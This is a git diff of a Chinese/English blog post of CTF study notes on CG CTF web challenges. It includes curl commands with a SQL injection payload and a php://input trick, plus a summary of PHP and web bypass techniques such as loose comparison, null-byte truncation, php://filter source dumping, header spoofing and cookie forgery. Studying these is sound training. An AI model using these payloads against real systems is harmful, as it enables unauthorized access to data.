@@ -1,8 +1,9 @@
 ---
 layout: post
 title:  "信息安全学习笔记 - CG CTF Web"
-date:   2020-03-21 13:15:38 +0800
+date:   2020-03-25 23:19:38 +0800
 ---
+# Problems
 
 ## 签到题
 
@@ -185,7 +186,7 @@ curl http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?
 ### Notes
 
 - `ereg`: null byte is considered as the end of string
-- [percent encoding](https://stackoverflow.com/a/5007362/8706476) in urls
+- [percent encoding](https://stackoverflow.com/a/5007362/8706476) in urls or form data
   - null byte "\x00": `%00`
   - pound sign "#": `%23`
   - single quote "'": `%27`
@@ -196,11 +197,11 @@ curl http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?
 ```php
 # Source
 if (isset($_GET['a']) and isset($_GET['b'])) {
-if ($_GET['a'] != $_GET['b'])
-if (md5($_GET['a']) == md5($_GET['b']))
-die('Flag: '.$flag);
-else
-print 'Wrong.';
+  if ($_GET['a'] != $_GET['b'])
+    if (md5($_GET['a']) == md5($_GET['b']))
+      die('Flag: '.$flag);
+    else
+      print 'Wrong.';
 }
 ```
 前面的两个float number format string应该派上用场了。
@@ -355,7 +356,7 @@ if($_POST[user] && $_POST[pass]) {
   }
 }
 ```
-让第一个字句返回结果为空，然后才能用上第二个字句的结果
+让第一个字句返回结果为空，然后才能用上第二个字句的结果；类似于编程语言中逻辑运算符的求值策略，short circuit evaluation
 ```shell
 curl http://4.chinalover.sinaapp.com/web6/index.php -X POST -d 'user=1%27+union+select+md5%28%2725252%27%29+--+m&pass=25252'
 ```
@@ -365,12 +366,22 @@ curl http://4.chinalover.sinaapp.com/web6/index.php -X POST -d 'user=1%27+union+
 - php [`mysql_fetch_array`](https://www.php.net/manual/en/function.mysql-fetch-array.php): Fetch **a** result row 
 
 
-<!-- ## [file_get_contents](http://chinalover.sinaapp.com/web23/)
+## [file_get_contents](http://chinalover.sinaapp.com/web23/)
+
+```html
+# Source
+<!--$file = $_GET['file'];
+if(@file_get_contents($file) == "meizijiu"){
+    echo $nctf;
+}-->
+```
 
 ```shell
-echo -n meizijiu > temp.txt
+curl http://chinalover.sinaapp.com/web23/?file=php://input -X POST -d 'meizijiu'
+```
 
-``` -->
+### Notes
+- php [I/O streams](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.input): `php://input` reads from `$_POST`
 
 ## [变量覆盖](http://chinalover.sinaapp.com/web24/)
 
@@ -390,3 +401,46 @@ curl http://chinalover.sinaapp.com/web24/?name=meizijiu233
 
 ### Notes
 - php [variable variable](https://www.php.net/manual/en/language.variables.variable.php)
+
+# Notes
+
+- php
+  - `strcmp` raises a warning but returns nothing when given an array
+  - `extract` imports variables into and may corrupts the current symbol table from an array 
+  - `ereg` considers null byte as the end of string, 
+    - while null bytes don't actually terminate a string.
+  - loosely equality `==`
+    - type cast
+      - hex string to integer
+    - float number format strings
+  - [I/O streams](https://www.php.net/manual/en/wrappers.php.php) along with file functions and **include** statement
+    - url taking as argument filename or php's
+    - `php://input` reads from `$_POST`
+    - `php://filter`
+      - `read`: filter
+        - `read=convert.base64-encode` can dump current page without recursion
+      - `resource`: file
+  - [variable variable](https://www.php.net/manual/en/language.variables.variable.php) allows user to have variable variable names. 
+  - `mysql_fetch_array` fetches one row
+- sqli
+  - single quotes
+  - comments `--` followed by **spaces**
+    - appended chars in case of trimming
+  - `union`
+    - short circuit evaluation
+- `curl`
+  - post an array in form data
+- http
+  - headers
+    - `X-Forwarded-For`
+    - `Client-Ip`
+  - [percent encoding](https://stackoverflow.com/a/5007362/8706476) in urls or form data
+    - null byte "\x00": `%00`
+    - pound sign "#": `%23`
+    - single quote "'": `%27`
+    - right parenthesis ")": `%29`
+  - hints in `robots.txt`
+  - forge cookie
+  - [`window.location`](https://developer.mozilla.org/en-US/docs/Web/API/Window/location) loads another document
+- md5
+  - collision
